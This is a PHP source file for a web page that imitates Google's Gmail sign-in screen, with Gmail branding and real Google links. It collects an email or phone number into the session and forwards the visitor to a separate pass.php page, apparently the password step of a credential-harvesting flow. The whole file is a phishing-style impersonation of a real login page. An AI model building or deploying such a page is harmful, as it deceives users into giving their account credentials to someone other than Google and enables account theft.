<?php
    session_start();
    $uid= $empty_err= $uid_err="";
    if($_SERVER["REQUEST_METHOD"]=="POST")
    {
        if(empty($_POST["login_id"]))
        {
            $empty_err="Enter an email or phone number.";
        }
        else
        {
            $_SESSION['login_id']=htmlspecialchars($_POST["login_id"]);
            $uid=htmlspecialchars($_POST["login_id"]);
            if(filter_var($uid,FILTER_VALIDATE_EMAIL) or (preg_match("/^[0-9]{10}+$/", $uid)))
            {
                header("Refresh:0; url=pass.php");
                exit();
            }
            else
            {
                $uid_err="Enter a valid input.";
            }
        }
    }
?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="stylee.css">
    <title>Gmail</title>
</head>

<body>
    <div class="container">
        <div class="container_left">
            <img src="logo.png" alt="Gmail_logo" id="logo">
            <h1>Sign in</h1>
            <p>to continue to Gmail</p>
        </div>
        <div class="container_right">
            <form action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]); ?>" method="post">
                <input type="text" name="login_id" class="u_input" placeholder="Email or phone">
                <div class="error"><?php echo $uid_err, $empty_err; ?></div>
                <a href="https://accounts.google.com/signin/v2/usernamerecovery?continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&ddm=0&dsh=S-31152428%3A1724651316711743&flowEntry=ServiceLogin&flowName=GlifWebSignIn&ifkv=Ab5oB3raGdAB4BvULtk7TbaFNUFYAvSp_yOSUGCEyjRZ5ia2GCOy63rSXBaFthdFKWnaC-Vqfytk7w&rip=1&service=mail"
                    class="forgot">Forgot email?</a>
                <p>Not your computer? Use Guest mode to sign in privately.</p>
                <a href="https://support.google.com/chrome/answer/6130773?hl=en">Learn more about using Guest mode</a>
                <button onclick="location.href='https://accounts.google.com/lifecycle/steps/signup/name?continue=https://mail.google.com/mail/&ddm=0&dsh=S-217637534:1724683584814256&flowEntry=SignUp&flowName=GlifWebSignIn&ifkv=Ab5oB3qDB1EgJz4LW-n_JyV5U8JmbXfhWWk0ENEmFPrMhKR5TTYM51i9aAa8E9cVjwVeyb4Vp6g2cg&rip=1&service=mail&TL=AKeb6mx7UBJ2IaWZsZyPpQ83xx9ZbqaJSHm0ThtG5OJr_LJd9DkmOJt8wwj4NOoI';">Create an account</button>
                <input type="submit" id="submit" value="Next">
            </form>
        </div>
    </div>
    <footer>
        <a href="https://support.google.com/accounts?hl=en&visit_id=638602484927413527-3160675327&rd=2&p=account_iph#topic=3382296">Help</a>
        <a href="https://policies.google.com/privacy?gl=IN&hl=en-US">Privacy</a>
        <a href="https://policies.google.com/terms?gl=IN&hl=en-US">Terms</a>
    </footer>
</body>

</html>